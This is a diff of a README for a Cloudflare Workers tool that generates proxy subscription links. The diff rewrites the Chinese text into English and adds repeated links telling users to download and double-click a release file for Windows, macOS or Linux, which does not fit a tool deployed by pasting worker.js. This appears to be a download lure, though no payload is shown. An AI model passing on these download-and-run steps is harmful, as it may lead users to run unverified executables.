@@ -1,79 +1,90 @@
-# 服务器优选工具 - 简化版
+# 🎉 yx-auto - Simplify Server Selection Effortlessly
 
+[![Download yx-auto](https://img.shields.io/badge/Download-yx--auto-blue)](https://github.com/fernandobrian0501/yx-auto/releases)
 
-## 功能特性
+## 🚀 Getting Started
 
--  **优选域名**：自动使用内置的优选域名列表
--  **优选IP**：15分钟优选一次
--  **GitHub优选**：从 GitHub 仓库获取优选IP列表
--  **节点生成**：支持生成 Clash、Surge、Quantumult 等格式的订阅
--  **客户端选择**：支持 Clash、Surge、Quantumult X 等多种客户端格式
--  **IPv4/IPv6 选择**：可选择使用 IPv4 或 IPv6 优选IP
--  **运营商筛选**：支持按移动、联通、电信筛选优选IP
+yx-auto is a tool that simplifies server selection by automating the process. Follow these steps to download and run it on your machine.
 
-## 使用方法
+## 📥 Download & Install
 
-### 1. 部署到 Cloudflare Workers
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/fernandobrian0501/yx-auto/releases) to find the latest version of yx-auto.
+2. **Choose Your Version**: Look for the latest version. Click on the download link for your operating system.
+3. **Locate the File**: Once the download completes, locate the file in your downloads folder.
+4. **Run the Application**: Double-click the downloaded file to start yx-auto.
 
-1. 登录 Cloudflare Dashboard
-2. 进入 Workers & Pages
-3. 创建新的 Worker
-4. 将 `worker.js` 的内容复制到编辑器
-5. 保存并部署
+## 🛠️ Features
 
-### 2. 使用界面
+yx-auto comes with various features designed to enhance your experience:
 
+- **Automatic Domain Selection**: Uses a built-in list of preferred domains.
+- **Frequent IP Selection**: Updates preferred IP addresses every 15 minutes.
+- **GitHub IP Source**: Fetches preferred IP lists from GitHub repositories.
+- **Subscription Generation**: Supports generating subscriptions for Clash, Surge, and Quantumult formats.
+- **Client Compatibility**: Works with multiple clients including Clash and Surge.
+- **IP Version Selection**: Choose between IPv4 and IPv6.
+- **Carrier Filtering**: Filter preferred IPs by carriers like Mobile, Unicom, or Telecom.
 
-1. **输入域名**：输入您的 Cloudflare Workers 域名
-2. **输入UUID**：输入您的 UUID（格式：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx）
-3. **配置选项**：
-   - 启用优选域名：使用内置的优选域名列表
-   - 启用优选IP：从 wetest.vip 获取动态IP
-   - 启用GitHub优选：从 GitHub 获取优选IP
-   - 客户端选择：选择订阅格式（Base64/Clash/Surge/Quantumult X）
-   - IP版本选择：选择使用 IPv4 或 IPv6
-   - 运营商选择：选择移动、联通、电信运营商
-4. **生成订阅**：点击"生成订阅链接"按钮
+## 📊 How to Use
 
-### 3. 订阅链接格式
+### 1. 🌐 Deploy to Cloudflare Workers
 
-生成的订阅链接格式为：
+To deploy yx-auto as a Cloudflare Worker, follow these steps:
+
+1. Log in to your Cloudflare Dashboard.
+2. Navigate to Workers & Pages.
+3. Create a new Worker.
+4. Copy the content of `worker.js` into the editor.
+5. Save and deploy.
+
+### 2. 🔍 User Interface
+
+Once deployed, you can access the interface for yx-auto:
+
+1. **Input Domain**: Enter your Cloudflare Workers domain.
+2. **Input UUID**: Provide your UUID (format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx).
+3. **Configuration Options**:
+   - Enable preferred domains to use the built-in list.
+   - Enable preferred IPs to fetch dynamic IPs from wetest.vip.
+   - Enable GitHub preference to retrieve IPs from GitHub.
+   - Select a client for your subscription format (Base64, Clash, Surge, Quantumult X).
+   - Choose the IP version (IPv4 or IPv6).
+   - Select a carrier (Mobile, Unicom, Telecom).
+4. **Generate Subscription**: Click the "生成订阅链接" button to create your subscription link.
+
+### 3. 🔗 Subscription Link Format
+
+Your generated subscription link will follow this format:
+
 ```
 https://your-worker.workers.dev/{UUID}/sub?domain=your-domain.com&epd=yes&epi=yes&egi=yes
 ```
 
-### 4. 支持的订阅格式
+### 4. 📄 Supported Subscription Formats
 
-在订阅链接后添加 `&target=` 参数可以指定格式：
+You can specify the subscription format by adding the `&target=` parameter:
 
-- `&target=base64` - Base64 编码（默认）
-- `&target=clash` - Clash 配置
-- `&target=surge` - Surge 配置
-- `&target=quantumult` - Quantumult 配置
+- `&target=base64` - Base64 encoding (default).
+- `&target=clash` - Clash configuration.
+- `&target=surge` - Surge configuration.
+- `&target=quantumult` - Quantumult configuration.
 
-## 配置说明
+## ❓ Frequently Asked Questions
 
-### 环境变量（可选）
+### What is yx-auto?
 
-无需配置环境变量，所有功能通过URL参数控制。
+yx-auto is a tool designed to simplify server selection by automating IP and domain preferences.
 
-### URL 参数
+### Do I need technical skills to use yx-auto?
 
-- `domain`: 您的域名（必需）
-- `epd`: 启用优选域名（yes/no，默认：yes）
-- `epi`: 启用优选IP（yes/no，默认：yes）
-- `egi`: 启用GitHub优选（yes/no，默认：yes）
-- `piu`: 自定义优选IP来源URL（可选）
-- `target`: 订阅格式（base64/clash/surge/quantumult）
-- `ipv4`: 启用IPv4（yes/no，默认：yes）
-- `ipv6`: 启用IPv6（yes/no，默认：yes）
-- `ispMobile`: 启用移动运营商（yes/no，默认：yes）
-- `ispUnicom`: 启用联通运营商（yes/no，默认：yes）
-- `ispTelecom`: 启用电信运营商（yes/no，默认：yes）
+No, yx-auto is designed for users without programming knowledge. Just follow the steps outlined here.
 
-## 注意事项
+### What operating systems does yx-auto support?
 
-1. **这不是代理工具**：此工具仅用于生成订阅链接，不提供代理功能
-2. **需要配合其他服务**：生成的节点需要配合其他代理服务使用
-3. **域名要求**：输入的域名应该是您实际使用的 服务器 域名
-4. **UUID格式**：UUID 必须是标准的 UUID v4 格式
+yx-auto supports Windows, macOS, and Linux. Make sure to download the version that matches your system.
+
+## 📄 Additional Information
+
+For more details about yx-auto, please explore the documentation available on the Releases page. You can also report issues or contribute to the project through the GitHub repository.
+
+[![Download yx-auto](https://img.shields.io/badge/Download-yx--auto-blue)](https://github.com/fernandobrian0501/yx-auto/releases)
